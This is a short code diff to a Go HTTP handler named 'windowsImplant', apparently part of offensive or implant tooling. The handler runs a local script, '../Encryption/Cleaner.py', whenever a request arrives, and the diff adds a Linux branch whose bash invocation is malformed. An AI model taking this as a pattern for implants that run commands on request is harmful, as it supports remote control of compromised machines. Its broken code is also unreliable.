@@ -26,6 +26,8 @@ func windowsImplant(w http.ResponseWriter, r *http.Request) {
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/c", "python ..\\Encryption\\Cleaner.py")
+	} else {
+		cmd = exec.Command("/bin/bash", "python ../Encryption/Cleaner.py")
 	}
 
 	err := cmd.Run()
